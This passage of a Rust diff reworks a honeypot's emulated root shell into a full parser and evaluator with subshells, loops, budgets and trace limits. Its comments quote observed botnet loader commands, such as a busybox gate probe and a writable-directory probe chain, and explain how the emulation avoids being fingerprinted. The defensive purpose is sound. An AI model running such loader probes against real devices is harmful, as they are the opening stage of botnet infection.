@@ -27,6 +27,16 @@
 //! `sensor_framework::sanitize_value` first - the same chokepoint `auth.rs` and `channel.rs`
 //! route through - so a command line can never forge a second wire record via an embedded CR/LF
 //! or ANSI escape.
+//!
+//! **The grammar.** An input line is tokenized (`lex`), parsed into a tree (`parse`, `ast`),
+//! expanded (`expand`, `arith`) and evaluated (`eval`) with real quoting, redirections,
+//! pipelines, lists, subshells and `if`/`for`/`while`/`until`; each simple command then
+//! dispatches through the `registry` to the handlers in this file and in `builtins`. Constructs
+//! outside that subset (`case`, `[[ ]]`, functions, `$'..'`, brace expansion, here-strings,
+//! arrays) parse and are skipped with status 0, so they never raise an error a real shell would
+//! not. Words are `String`s; migrating every handler to byte-string arguments is deferred to
+//! when a command family (F1/F2) needs it.
+#![forbid(unsafe_code)]
 
 use std::net::IpAddr;
 use std::sync::Arc;
@@ -42,11 +52,20 @@ use crate::fakefs::{Blob, FakeFs, FsError, READ_CAP};
 use crate::persona;
 use crate::sanitize_value;
 
+mod arith;
+mod ast;
+mod builtins;
+mod eval;
+mod expand;
+mod lex;
+mod parse;
 mod registry;
 mod trace;
 
+use eval::{DepthGuard, LineBudget, PidAlloc, ShellState, Stdin};
 use registry::{HandlerFn, Registry};
 
+pub use ast::UnsupportedKind;
 pub use trace::{
     BudgetHit, BudgetTrace, CommandTrace, FsDenied, FsEffect, HandlerId, LineTrace, ParseNode,
     RunDecision, SegmentTrace, TraceEventKind,
@@ -103,30 +122,18 @@ pub struct OutputSegment {
     pub bytes: Vec<u8>,
 }
 
-/// One output redirection parsed from a simple command's whitespace tokens. S5 models fd 1
-/// (stdout) and fd 2 (stderr) only; the full 0-9 open-file-description table is S8.
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-struct Redirection<'a> {
-    /// Source fd being redirected: 1 for `>`/`>>`, 2 for `2>`, etc.
-    fd: u8,
-    kind: RedirKind<'a>,
-}
-
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-enum RedirKind<'a> {
-    /// `> t`, `>> t`, `>t`, `2>t`: write (append=false truncates, true appends) to a path token.
-    /// `/dev/null` is recognised at apply time and discards; it is NOT created as a file.
-    File { target: &'a str, append: bool },
-    /// `N>&M` / `>&M`: duplicate fd M's current destination onto fd N (`2>&1`, `1>&2`).
-    Dup(u8),
-    /// `N>&-`: close fd N (route to discard).
-    Close,
-}
-
-/// A simple command's argv with its output redirections removed, produced by `split_redirections`.
-struct Redirected<'a> {
-    argv: Vec<&'a str>,
-    redirs: Vec<Redirection<'a>>,
+/// A non-local transfer of control a builtin asked for, carried up the tree until something
+/// consumes it: a loop takes `break` and `continue`, a subshell takes `exit`.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
+enum Flow {
+    #[default]
+    None,
+    /// `break N`: leave N loops.
+    Break(u32),
+    /// `continue N`: go on to the next trip of the Nth loop out.
+    Continue(u32),
+    /// `exit` inside a subshell, a pipeline stage or a script run by `sh -c`.
+    ExitSubshell,
 }
 
 /// The observable result of one command or command list. Status is authoritative for shell
@@ -138,6 +145,7 @@ pub struct CommandResult {
     pub close_session: bool,
     combined: Vec<u8>,
     stop_line: bool,
+    flow: Flow,
 }
 
 impl CommandResult {
@@ -148,7 +156,26 @@ impl CommandResult {
             close_session: false,
             combined: Vec::new(),
             stop_line: false,
+            flow: Flow::None,
         }
+    }
+
+    /// Remove what was written to standard output and return it; standard error stays.
+    fn take_stdout(&mut self) -> Vec<u8> {
+        let mut taken = Vec::new();
+        let mut kept = Vec::new();
+        let mut combined = Vec::new();
+        for segment in std::mem::take(&mut self.output) {
+            if segment.fd == OutputFd::Stdout {
+                taken.extend_from_slice(&segment.bytes);
+            } else {
+                combined.extend_from_slice(&segment.bytes);
+                kept.push(segment);
+            }
+        }
+        self.output = kept;
+        self.combined = combined;
+        taken
     }
 
     fn stdout(bytes: impl Into<Vec<u8>>) -> Self {
@@ -169,6 +196,7 @@ impl CommandResult {
             output: vec![OutputSegment { fd, bytes }],
             close_session: false,
             stop_line: false,
+            flow: Flow::None,
         }
     }
 
@@ -179,10 +207,13 @@ impl CommandResult {
         result
     }
 
+    /// Add what `other` produced after this. The status and any pending flow are `other`'s, the
+    /// most recent command's.
     fn append(&mut self, mut other: Self) {
         self.status = other.status;
         self.close_session |= other.close_session;
         self.stop_line |= other.stop_line;
+        self.flow = other.flow;
         self.combined.append(&mut other.combined);
         self.output.append(&mut other.output);
     }
@@ -266,7 +297,6 @@ pub(crate) const MAX_COMMANDS_PER_SESSION: u64 = 256;
 pub struct FakeShell {
     fs: FakeFs,
     ctx: EmitContext,
-    cwd: String,
     /// Per-session de-obfuscation for XOR-encoded command probes (see `command_codec`).
     codec: CommandCodec,
     /// Whether the one-per-session binary-flood marker has been emitted.
@@ -275,7 +305,10 @@ pub struct FakeShell {
     /// prompts; the flavor keeps `uname` aligned with the filesystem snapshot.
     flavor: ShellFlavor,
     context: ShellContext,
-    levels: Vec<ShellLevel>,
+    /// The shells and subshells open right now, outermost first, each with its own state. The
+    /// first is the login shell. A subshell, pipeline stage or substitution pushes a copy of the
+    /// state and pops it, discarding what it changed.
+    frames: Vec<Frame>,
     hostname: String,
     clock: Clock,
     /// What the engine decided for the current input line; reset at the top of `handle_input`.
@@ -283,13 +316,50 @@ pub struct FakeShell {
     /// Commands open at this moment, outermost first. A re-entrant dispatch pushes; closing pops
     /// and attaches to the parent's `reentry` or, for the outermost, to the current segment.
     trace_stack: Vec<CommandTrace>,
+    /// Trace nodes recorded for the current line, so a loop cannot grow the trace without bound.
+    trace_nodes: usize,
+    /// Commands opened past the trace cap: their closes are matched and dropped.
+    trace_dropped: u32,
     /// Steps and bytes the current line may still spend. Reset once per line, never on re-entry,
-    /// so a chain of nested dispatches shares one allowance.
-    work_left: u64,
-    /// Whether the line has spent it; the line stops at the next checkpoint.
-    work_exhausted: bool,
-    /// Depth of re-entrant dispatch right now.
-    depth: u32,
+    /// so a chain of nested dispatches and every loop trip share one allowance.
+    line: LineBudget,
+    /// Recursive entries right now: compound commands, substitutions, applets, scripts.
+    depth: DepthGuard,
+    /// Lines held for an incomplete construct, waiting for the rest (the PS2 continuation).
+    pending: Vec<String>,
+    pending_bytes: usize,
+    /// Where the running command reads standard input.
+    stdin: Stdin,
+    /// Process ids for `$$` and `$!`, deterministic for a session.
+    pids: PidAlloc,
+    /// The last job number a background command was given.
+    next_job: u32,
+    /// What `$( )` expansions wrote to standard error while a command's words were expanded; it
+    /// goes ahead of that command's own output.
+    deferred_stderr: Vec<OutputSegment>,
+    /// The status of the last `$( )` run while expanding the current command.
+    last_subst_status: Option<u8>,
+    /// Scripts, subshells, pipeline stages and substitutions open right now: the shell is not
+    /// reading the terminal.
+    script_depth: u32,
+    /// Loops open right now, for `break` and `continue`.
+    loop_depth: u32,
+}
+
+/// One entry of the shell stack.
+struct Frame {
+    kind: FrameKind,
+    state: ShellState,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum FrameKind {
+    /// A shell that reads the terminal: the login shell, or one opened by `sh` or `su`.
+    Level(ShellLevel),
+    /// A shell running a script (`sh -c`, `sh FILE`, a piped script): it ends when the script does.
+    Script(ShellLevel),
+    /// A subshell, pipeline stage, substitution or background job.
+    Subshell,
 }
 
 /// How the outermost shell was entered. Login shells read Ubuntu's interactive startup files;
@@ -355,26 +425,38 @@ impl FakeShell {
             ShellContext::ExecC => ShellLevel::Bash { login: false },
             ShellContext::AndroidMksh => ShellLevel::AndroidMksh,
         };
-        let work_left = fs.budget().limits().work_per_line;
+        let line = LineBudget::new(fs.budget().limits().work_per_line);
+        let hostname = persona::hostname();
+        let pid = persona::session_pid(ctx.session_id.map(|id| id.as_u128()));
+        let state = ShellState::login(flavor, pid, &hostname);
         Self {
             fs,
             ctx,
-            cwd: match flavor {
-                ShellFlavor::Bash => "/root".to_string(),
-                ShellFlavor::AndroidSh => "/".to_string(),
-            },
             codec: CommandCodec::new(),
             binary_flagged: false,
             flavor,
             context,
-            levels: vec![level],
-            hostname: persona::hostname(),
+            frames: vec![Frame {
+                kind: FrameKind::Level(level),
+                state,
+            }],
+            hostname,
             clock: chrono::Utc::now,
             trace: LineTrace::default(),
             trace_stack: Vec::new(),
-            work_left,
-            work_exhausted: false,
-            depth: 0,
+            trace_nodes: 0,
+            trace_dropped: 0,
+            line,
+            depth: DepthGuard::default(),
+            pending: Vec::new(),
+            pending_bytes: 0,
+            stdin: Stdin::Terminal,
+            pids: PidAlloc::new(pid),
+            next_job: 0,
+            deferred_stderr: Vec::new(),
+            last_subst_status: None,
+            script_depth: 0,
+            loop_depth: 0,
         }
     }
 
@@ -394,7 +476,7 @@ impl FakeShell {
     /// instead of the standard-limits budget a shell starts with. Every shell of a connection takes
     /// a clone of the same `Arc`.
     pub fn with_budget(mut self, budget: Arc<ConnectionBudget>) -> Self {
-        self.work_left = budget.limits().work_per_line;
+        self.line = LineBudget::new(budget.limits().work_per_line);
         self.fs = self.fs.with_budget(budget);
         self
     }
@@ -404,38 +486,81 @@ impl FakeShell {
         self.fs.budget()
     }
 
-    /// The working directory, for the prompt a sensor prints between commands.
-    pub fn cwd(&self) -> &str {
-        &self.cwd
+    /// The state the running command sees: the innermost frame's.
+    fn state(&self) -> &ShellState {
+        &self
+            .frames
+            .last()
+            .expect("a FakeShell always has an outermost level")
+            .state
     }
 
-    /// The prompt for the active shell level. Exec requests have no prompt.
+    fn state_mut(&mut self) -> &mut ShellState {
+        &mut self
+            .frames
+            .last_mut()
+            .expect("a FakeShell always has an outermost level")
+            .state
+    }
+
+    /// The working directory, for the prompt a sensor prints between commands.
+    pub fn cwd(&self) -> &str {
+        &self.state().cwd
+    }
+
+    /// The prompt for the active shell level. Exec requests have no prompt. While a construct is
+    /// incomplete the continuation prompt (PS2) stands in for it.
     pub fn prompt(&self) -> String {
+        if !self.pending.is_empty() && self.context != ShellContext::ExecC {
+            return "> ".to_string();
+        }
+        let cwd = self.cwd();
         match (self.context, self.active_level()) {
             (ShellContext::ExecC, _) => String::new(),
             (_, ShellLevel::Bash { .. }) => {
-                let display = match self.cwd.strip_prefix("/root") {
+                let display = match cwd.strip_prefix("/root") {
                     Some("") => "~".to_string(),
                     Some(rest) if rest.starts_with('/') => format!("~{rest}"),
-                    _ => self.cwd.clone(),
+                    _ => cwd.to_string(),
                 };
                 format!("root@{}:{display}# ", self.hostname)
             }
             (_, ShellLevel::Dash { .. }) => "# ".to_string(),
-            (_, ShellLevel::AndroidMksh) => persona::android_root_prompt(&self.cwd),
+            (_, ShellLevel::AndroidMksh) => persona::android_root_prompt(cwd),
         }
     }
 
+    /// The innermost shell, subshells looked through.
     fn active_level(&self) -> ShellLevel {
-        self.levels
-            .last()
-            .copied()
+        self.frames
+            .iter()
+            .rev()
+            .find_map(|frame| match frame.kind {
+                FrameKind::Level(level) | FrameKind::Script(level) => Some(level),
+                FrameKind::Subshell => None,
+            })
             .expect("a FakeShell always has an outermost level")
     }
 
+    /// Shell levels open that read the terminal (the login shell counts).
+    fn open_levels(&self) -> usize {
+        self.frames
+            .iter()
+            .filter(|frame| matches!(frame.kind, FrameKind::Level(_)))
+            .count()
+    }
+
     fn advance_shell_line(&mut self) {
-        if let Some(ShellLevel::Dash { line }) = self.levels.last_mut() {
-            *line = line.saturating_add(1);
+        for frame in self.frames.iter_mut().rev() {
+            match &mut frame.kind {
+                FrameKind::Level(ShellLevel::Dash { line })
+                | FrameKind::Script(ShellLevel::Dash { line }) => {
+                    *line = line.saturating_add(1);
+                    return;
+                }
+                FrameKind::Level(_) | FrameKind::Script(_) => return,
+                FrameKind::Subshell => {}
+            }
         }
     }
 
@@ -498,13 +623,17 @@ impl FakeShell {
     /// this module not dictated directly by the interface.
     pub fn handle_input(&mut self, line: impl AsRef<[u8]>) -> (CommandResult, Vec<SensorEvent>) {
         let raw = String::from_utf8_lossy(line.as_ref());
+        self.begin_line();
         if raw.trim().is_empty() {
-            return (CommandResult::silent(0), Vec::new());
+            if self.pending.is_empty() {
+                return (CommandResult::silent(0), Vec::new());
+            }
+            // A blank line inside an open construct (a here-document body, a continued command)
+            // belongs to it, and is still not a command of its own.
+            self.advance_shell_line();
+            return (self.feed_line(""), Vec::new());
         }
         self.trace = LineTrace::default();
-        self.trace_stack.clear();
-        self.work_left = self.budget().limits().work_per_line;
-        self.work_exhausted = false;
         self.advance_shell_line();
 
         // Decode a single-byte-XOR-obfuscated probe (identity for plaintext). The event records a
@@ -618,214 +747,58 @@ impl FakeShell {
             evs
         };
 
-        let output = self.run_line(&decoded);
+        let output = self.run_input(&decoded);
         tracing::debug!(target: "propolis::shell::trace", trace = ?self.trace, "shell line");
         (output, events)
     }
 
-    /// Run one decoded input line the way a shell reads it: each simple command in order, with
-    /// `&&` and `||` short-circuiting on the previous command's outcome and `;`, `&` and a
-    /// newline just sequencing. A pipeline stays one command answered by its first stage, and
-    /// quotes are not parsed; this is a response grammar, not an interpreter. Dispatching the
-    /// whole line as one command answered a loader's gate line `ls /home; /bin/busybox BOTNET`
-    /// with "ls: cannot access '/home;'" and never ran the busybox probe, so the bot never got
-    /// the "applet not found" reply it waits for and left before its download stage (observed
-    /// live 2026-09-06).
-    fn run_line(&mut self, decoded: &str) -> CommandResult {
+    /// Reset what is scoped to one input line: the work allowance, the trace, the stack of
+    /// subshells and the state a previous line's early stop could have left behind. Depth is
+    /// balanced by every entry, so it is not reset.
+    fn begin_line(&mut self) {
+        self.line = LineBudget::new(self.budget().limits().work_per_line);
+        self.trace_stack.clear();
+        self.trace_nodes = 0;
+        self.trace_dropped = 0;
+        self.frames
+            .retain(|frame| matches!(frame.kind, FrameKind::Level(_)));
+        self.stdin = Stdin::Terminal;
+        self.deferred_stderr.clear();
+        self.last_subst_status = None;
+        self.script_depth = 0;
+        self.loop_depth = 0;
+    }
+
+    /// Run one decoded input as a shell reads it, one physical line at a time: each line joins
+    /// any lines still open, and once the text is a complete command it is parsed and evaluated
+    /// (see `eval`). A line that leaves a construct open prints nothing and the prompt becomes the
+    /// continuation prompt until the construct is closed.
+    ///
+    /// Dispatching a whole line as one command answered a loader's gate line
+    /// `ls /home; /bin/busybox BOTNET` with "ls: cannot access '/home;'" and never ran the busybox
+    /// probe, so the bot never got the "applet not found" reply it waits for and left before its
+    /// download stage (observed live 2026-09-06).
+    fn run_input(&mut self, decoded: &str) -> CommandResult {
+        if self.context == ShellContext::ExecC {
+            // An exec request is one complete command string, as `bash -c` gets it: there is no
+            // next line to finish an open construct, so it is parsed whole.
+            return self.run_script_text(decoded);
+        }
         let mut result = CommandResult::silent(0);
-        for (op, segment) in control_segments(decoded) {
-            if !self.charge_work(1) {
-                result.stop_line = true;
-                break;
+        let mut first = true;
+        let text = decoded.strip_suffix('\n').unwrap_or(decoded);
+        for physical in text.split('\n') {
+            if !first {
+                self.advance_shell_line();
             }
-            let run = match op {
-                ControlOp::Seq => true,
-                ControlOp::And => result.status == 0,
-                ControlOp::Or => result.status != 0,
-            };
-            let decision = match (run, op) {
-                (true, _) => RunDecision::Ran,
-                (false, ControlOp::And) => RunDecision::SkippedByAnd,
-                (false, _) => RunDecision::SkippedByOr,
-            };
-            self.trace.segments.push(SegmentTrace {
-                op,
-                decision,
-                command: None,
-            });
-            if !run {
-                continue;
-            }
-            let all: Vec<&str> = segment.split_whitespace().collect();
-            let stage = first_pipeline_stage(&all);
-            if stage.is_empty() {
-                continue;
-            }
-            let command = self.run_simple(stage, stage.len() < all.len());
-            result.append(command);
+            first = false;
+            let ran = self.feed_line(physical);
+            result.append(ran);
             if result.stop_line {
                 break;
             }
         }
         result
-    }
-
-    /// Run one simple command (the first pipeline stage of a control segment): parse its
-    /// redirections, open the targets before dispatch (a real shell opens fds before exec),
-    /// dispatch the command, then route each output segment to its fd's destination.
-    ///
-    /// A command made only of redirections (`> path`) is a real command: it opens the file for
-    /// writing and prints nothing. Loaders probe for a writable directory this way, chaining
-    /// `>/var/run/.x && cd /var/run` across a list of candidates, and the probe must succeed
-    /// exactly where the box would let it (the directory exists) and fail with the shell's own
-    /// message where it does not, or the `&&` after it runs in the wrong places. Dispatching
-    /// `>/var/run/.x` as a command name answered "command not found", failed every probe, and the
-    /// chain never reached the busybox marker the loader keys its next stage on (observed live
-    /// 2026-09-06).
-    ///
-    /// `piped` marks a stage that was the first of a pipeline, for the trace only.
-    fn run_simple(&mut self, stage: &[&str], piped: bool) -> CommandResult {
-        let Redirected { argv, redirs } = split_redirections(stage);
-        let (node, resolved) = if argv.is_empty() {
-            (ParseNode::RedirectionOnly, HandlerId::RedirectionOnly)
-        } else if piped {
-            (ParseNode::Pipeline, self.resolve_handler(&argv))
-        } else {
-            (ParseNode::Simple, self.resolve_handler(&argv))
-        };
-        self.trace_open(stage, node, resolved);
-        let result = self.run_redirected(&argv, &redirs);
-        self.trace_close(result.status);
-        result
-    }
-
-    fn run_redirected(&mut self, argv: &[&str], redirs: &[Redirection<'_>]) -> CommandResult {
-        #[derive(Clone)]
-        enum Sink {
-            Terminal,
-            Discard,
-            File { path: String, append: bool },
-        }
-
-        // Destination per fd; index 0 is unused, 1 is stdout, 2 is stderr.
-        let mut sink = [Sink::Terminal, Sink::Terminal, Sink::Terminal];
-
-        // The first failing file redirection prints the shell's own error and the command never
-        // dispatches, as in bash.
-        for r in redirs {
-            let idx = usize::from(r.fd);
-            match r.kind {
-                RedirKind::Close => {
-                    if let Some(slot) = sink.get_mut(idx) {
-                        *slot = Sink::Discard;
-                    }
-                }
-                RedirKind::Dup(m) => {
-                    let dest = sink.get(usize::from(m)).cloned().unwrap_or(Sink::Terminal);
-                    if let Some(slot) = sink.get_mut(idx) {
-                        *slot = dest;
-                    }
-                }
-                RedirKind::File { target, append } => {
-                    let resolved = self.resolve_logical(target);
-                    if is_discard_path(&resolved) {
-                        if let Some(slot) = sink.get_mut(idx) {
-                            *slot = Sink::Discard;
-                        }
-                        continue;
-                    }
-                    // `>>` keeps an existing file's content; everything else creates or truncates.
-                    let open = if append && self.fs.file_exists(&resolved) {
-                        Ok(())
-                    } else {
-                        self.traced_create(&resolved)
-                    };
-                    if let Err(error) = open {
-                        return self.redirect_open_error(&resolved, &error);
-                    }
-                    if let Some(slot) = sink.get_mut(idx) {
-                        *slot = Sink::File {
-                            path: resolved,
-                            append,
-                        };
-                    }
-                }
-            }
-        }
-
-        // An empty argv (a redirection-only command) dispatches to a silent success.
-        let mut result = self.dispatch(argv);
-        // Charged here, once per command and before output is routed, so bytes a redirection sends
-        // to a file cost the line as much as bytes sent to the terminal, and a re-entrant command's
-        // output is not counted twice.
-        if !self.charge_work(len_u64(result.bytes().len())) {
-            result.stop_line = true;
-        }
-        if redirs.is_empty() {
-            return result;
-        }
-
-        let mut kept: Vec<OutputSegment> = Vec::new();
-        let mut writes: Vec<(String, bool, Vec<u8>)> = Vec::new();
-        for seg in &result.output {
-            let idx = match seg.fd {
-                OutputFd::Stdout => 1,
-                OutputFd::Stderr => 2,
-            };
-            match sink.get(idx) {
-                Some(Sink::Discard) => {}
-                Some(Sink::File { path, append }) => {
-                    match writes.iter_mut().find(|(p, _, _)| p == path) {
-                        Some((_, _, buf)) => buf.extend_from_slice(&seg.bytes),
-                        None => writes.push((path.clone(), *append, seg.bytes.clone())),
-                    }
-                }
-                Some(Sink::Terminal) | None => kept.push(seg.clone()),
-            }
-        }
-
-        // The target was truncated or preserved at open, so `>` and `>>` both continue from the
-        // file's current content. Only a budget refusal is reported: the target opened, so any
-        // other refusal cannot happen here.
-        let mut write_refusal = None;
-        for (path, append, bytes) in writes {
-            let mut content = if append {
-                self.fs.read_all(&path, READ_CAP).unwrap_or_default()
-            } else {
-                Vec::new()
-            };
-            content.extend_from_slice(&bytes);
-            if let Err(error) = self.traced_write_file(&path, &content) {
-                write_refusal = write_refusal.or_else(|| budget_refusal_text(&error));
-            }
-        }
-
-        let mut terminal = CommandResult::silent(result.status);
-        for seg in kept {
-            terminal.append(CommandResult::one(seg.fd, result.status, seg.bytes));
-        }
-        if let Some(reason) = write_refusal {
-            // [unverified] wording: the `write error` form is what a command prints when a write
-            // to its redirected stdout fails; no capture of the sensor's exact commands exists.
-            let command = argv.first().map_or("sh", |arg| command_basename(arg));
-            terminal.append(CommandResult::stderr(
-                1,
-                format!("{command}: write error: {reason}\n"),
-            ));
-        }
-        terminal.close_session = result.close_session;
-        terminal.stop_line = result.stop_line;
-        terminal
-    }
-
-    /// What the shell itself says when it cannot open a redirection target.
-    fn redirect_open_error(&self, resolved: &str, error: &FsError) -> CommandResult {
-        let reason = match error {
-            FsError::ReadOnly => "Read-only file system",
-            FsError::IsADirectory => "Is a directory",
-            other => budget_refusal_text(other).unwrap_or("No such file or directory"),
-        };
-        CommandResult::stderr(1, self.shell_error(format_args!("{resolved}: {reason}")))
     }
 
     /// Build a `honeypot_command_exec` event carrying `metadata`, stamped from the session context.
@@ -882,7 +855,7 @@ impl FakeShell {
     fn dispatch(&mut self, parts: &[&str]) -> CommandResult {
         // One step per entry, so a chain of nested dispatches spends the line's allowance.
         if !self.charge_work(1) {
-            let mut stopped = CommandResult::silent(0);
+            let mut stopped = CommandResult::silent(1);
             stopped.stop_line = true;
             return stopped;
         }
@@ -920,11 +893,7 @@ impl FakeShell {
     }
 
     fn builtin_pwd(&mut self, _parts: &[&str]) -> CommandResult {
-        CommandResult::stdout(format!("{}\n", self.cwd))
-    }
-
-    fn builtin_echo_argv0(&mut self, _parts: &[&str]) -> CommandResult {
-        CommandResult::stdout(format!("{}\n", self.argv_zero()))
+        CommandResult::stdout(format!("{}\n", self.cwd()))
     }
 
     fn builtin_echo(&mut self, parts: &[&str]) -> CommandResult {
@@ -947,14 +916,6 @@ impl FakeShell {
 
     fn builtin_enable_not_found(&mut self, _parts: &[&str]) -> CommandResult {
         CommandResult::stderr(127, self.not_found("enable"))
-    }
-
-    fn builtin_true(&mut self, _parts: &[&str]) -> CommandResult {
-        CommandResult::silent(0)
-    }
-
-    fn builtin_false(&mut self, _parts: &[&str]) -> CommandResult {
-        CommandResult::silent(1)
     }
 
     fn builtin_wget(&mut self, parts: &[&str]) -> CommandResult {
@@ -1031,22 +992,6 @@ impl FakeShell {
         CommandResult::silent(0)
     }
 
-    fn builtin_cd(&mut self, parts: &[&str]) -> CommandResult {
-        // Only into a directory the box presents: a silent `cd` into a directory that
-        // `ls /` never showed is a tell, and a loader's `>/x/.x && cd /x` chain relies on
-        // the two agreeing about what exists.
-        let target = self.resolve_logical(first_non_flag_arg(&parts[1..]).unwrap_or("/root"));
-        if self.fs.is_dir(&target) {
-            self.cwd = target;
-            CommandResult::silent(0)
-        } else {
-            CommandResult::stderr(
-                1,
-                self.shell_error(format_args!("cd: {target}: No such file or directory")),
-            )
-        }
-    }
-
     /// Already root on this box, so `su` (and `su -`, `su root`) opens another bash
     /// silently. It is still a real nested level: one `exit` returns to the caller.
     fn builtin_su(&mut self, _parts: &[&str]) -> CommandResult {
@@ -1056,14 +1001,6 @@ impl FakeShell {
         };
         self.push_level(level);
         CommandResult::silent(0)
-    }
-
-    fn builtin_exit(&mut self, _parts: &[&str]) -> CommandResult {
-        self.exit_shell()
-    }
-
-    fn builtin_logout(&mut self, _parts: &[&str]) -> CommandResult {
-        self.logout_shell()
     }
 
     /// A token with a slash names a path, and bash answers for the path, not for PATH:
@@ -1101,45 +1038,50 @@ impl FakeShell {
     /// command that caused it.
     ///
     /// Every re-entrant path goes through here, so this is where the depth cap holds. A refusal
-    /// is a silent success: no real loader nests this deep, the cap is a stack and DoS guard, and
-    /// a novel error string would itself be a fingerprint. The trace shows it fired.
+    /// is a bounded silent failure (status 1): no real loader nests this deep, the cap is a stack
+    /// and DoS guard, and a novel error string would itself be a fingerprint. The trace shows it
+    /// fired.
     fn dispatch_nested(&mut self, parts: &[&str]) -> CommandResult {
         let max_depth = self.budget().limits().max_depth;
-        if self.depth >= max_depth {
+        if !self.depth.try_enter(max_depth) {
             self.record_hit(BudgetHit::Depth);
             self.note_depth();
-            return CommandResult::silent(0);
+            return CommandResult::silent(1);
         }
-        self.depth = self.depth.saturating_add(1);
         self.note_depth();
         let resolved = self.resolve_handler(parts);
         self.trace_open(parts, ParseNode::Simple, resolved);
         let result = self.dispatch(parts);
         self.trace_close(result.status);
-        self.depth = self.depth.saturating_sub(1);
+        self.depth.leave();
         result
     }
 
     fn note_depth(&mut self) {
-        let reached = self.trace.budget.max_depth_reached.max(self.depth);
+        let reached = self
+            .trace
+            .budget
+            .max_depth_reached
+            .max(self.depth.current());
         self.trace.budget.max_depth_reached = reached;
     }
 
     /// Spend `n` steps or bytes of the line's allowance. False once it is spent, and from then on:
-    /// the caller stops the line. The allowance is shared by every nested dispatch of the line.
+    /// the caller stops the line. The allowance is shared by parsing, expansion, every loop trip
+    /// and every nested dispatch of the line.
     fn charge_work(&mut self, n: u64) -> bool {
-        self.trace.budget.work_charged = self.trace.budget.work_charged.saturating_add(n);
-        if self.work_exhausted {
-            return false;
-        }
-        if n > self.work_left {
-            self.work_left = 0;
-            self.work_exhausted = true;
+        let allowed = self.line.charge(n);
+        self.sync_budget_trace();
+        allowed
+    }
+
+    /// Bring the trace's work count and first-hit note up to date with the line budget, after
+    /// anything that charged it directly (the parser).
+    fn sync_budget_trace(&mut self) {
+        self.trace.budget.work_charged = self.line.charged();
+        if self.line.take_refusal() {
             self.record_hit(BudgetHit::Work);
-            return false;
         }
-        self.work_left = self.work_left.saturating_sub(n);
-        true
     }
 
     /// Note the first cap this line ran into.
@@ -1147,14 +1089,48 @@ impl FakeShell {
         self.trace.budget.hit.get_or_insert(hit);
     }
 
+    /// The most nodes one line's trace records; a loop that runs many trips keeps the first.
+    const MAX_TRACE_NODES: usize = 512;
+
     fn trace_open(&mut self, tokens: &[&str], node: ParseNode, resolved: HandlerId) {
+        if self.trace_dropped > 0 || self.trace_nodes >= Self::MAX_TRACE_NODES {
+            self.trace_dropped = self.trace_dropped.saturating_add(1);
+            return;
+        }
+        self.trace_nodes = self.trace_nodes.saturating_add(1);
         self.trace_stack
             .push(CommandTrace::open(tokens, node, resolved));
+    }
+
+    /// Fill in the command opened as a placeholder, once its words are known.
+    fn trace_set(&mut self, tokens: &[String], node: ParseNode, resolved: HandlerId) {
+        if self.trace_dropped > 0 {
+            return;
+        }
+        if let Some(open) = self.trace_stack.last_mut() {
+            open.tokens = tokens.to_vec();
+            open.node = node;
+            open.resolved = resolved;
+        }
+    }
+
+    /// Note why the open command was skipped.
+    fn trace_unsupported(&mut self, kind: UnsupportedKind) {
+        if self.trace_dropped > 0 {
+            return;
+        }
+        if let Some(open) = self.trace_stack.last_mut() {
+            open.unsupported = Some(kind);
+        }
     }
 
     /// Close the innermost open command with its `status`, attaching it to its caller or, for the
     /// outermost, to the segment being run.
     fn trace_close(&mut self, status: u8) {
+        if self.trace_dropped > 0 {
+            self.trace_dropped = self.trace_dropped.saturating_sub(1);
+            return;
+        }
         let Some(mut command) = self.trace_stack.pop() else {
             return;
         };
@@ -1170,6 +1146,9 @@ impl FakeShell {
     }
 
     fn trace_fs(&mut self, effect: FsEffect) {
+        if self.trace_dropped > 0 {
+            return;
+        }
         if let Some(open) = self.trace_stack.last_mut() {
             open.fs_effects.push(effect);
         }
@@ -1261,10 +1240,21 @@ impl FakeShell {
     /// normalised lexically. Symlinks stay unresolved here, so `cd /var/run` leaves `pwd` at
     /// `/var/run` as bash's logical mode does; [`FakeFs`] resolves them physically per operation.
     fn resolve_logical(&mut self, arg: &str) -> String {
+        let normalized = self.normalize_logical(arg);
+        // The shell's own `/proc/<pid>` is `/proc/self` to the shell.
+        let own = format!("/proc/{}", self.state().pid);
+        match normalized.strip_prefix(&own) {
+            Some(rest) if rest.is_empty() || rest.starts_with('/') => format!("/proc/self{rest}"),
+            _ => normalized,
+        }
+    }
+
+    /// [`Self::resolve_logical`] without the `/proc/<pid>` alias.
+    fn normalize_logical(&mut self, arg: &str) -> String {
         let joined = if arg.starts_with('/') {
             arg.to_string()
         } else {
-            format!("{}/{arg}", self.cwd.trim_end_matches('/'))
+            format!("{}/{arg}", self.cwd().trim_end_matches('/'))
         };
         // Normalise the way a kernel resolves a path: `.` and an empty segment (a trailing or
         // doubled slash) drop out, `..` climbs. Without this `./payload` - the form every
@@ -1306,19 +1296,38 @@ impl FakeShell {
         }
     }
 
+    /// Open a shell level that reads the terminal, the way `sh` and `su` do: it inherits the
+    /// exported variables and the working directory, and has a process id of its own.
     fn push_level(&mut self, level: ShellLevel) {
-        self.levels.push(level);
+        let pid = self.pids.next();
+        let state = self.state().child(pid);
+        self.frames.push(Frame {
+            kind: FrameKind::Level(level),
+            state,
+        });
     }
 
-    fn exit_shell(&mut self) -> CommandResult {
-        if self.levels.len() > 1 {
-            let popped = self.levels.pop().expect("length checked above");
-            let output = if matches!(popped, ShellLevel::Bash { .. }) {
+    /// Open a shell level that runs one script and ends with it.
+    fn push_script_level(&mut self, level: ShellLevel) {
+        let pid = self.pids.next();
+        let state = self.state().child(pid);
+        self.frames.push(Frame {
+            kind: FrameKind::Script(level),
+            state,
+        });
+    }
+
+    /// Leave the innermost shell level that reads the terminal, or end the session from the login
+    /// shell. `status` is what `exit` was given.
+    fn exit_shell(&mut self, status: u8) -> CommandResult {
+        if self.open_levels() > 1 {
+            let popped = self.frames.pop().map(|frame| frame.kind);
+            let output = if matches!(popped, Some(FrameKind::Level(ShellLevel::Bash { .. }))) {
                 b"exit\n".to_vec()
             } else {
                 Vec::new()
             };
-            return CommandResult::shell_exit(0, output, false);
+            return CommandResult::shell_exit(status, output, false);
         }
 
         let output = if matches!(self.active_level(), ShellLevel::Bash { login: true }) {
@@ -1326,12 +1335,12 @@ impl FakeShell {
         } else {
             Vec::new()
         };
-        CommandResult::shell_exit(0, output, true)
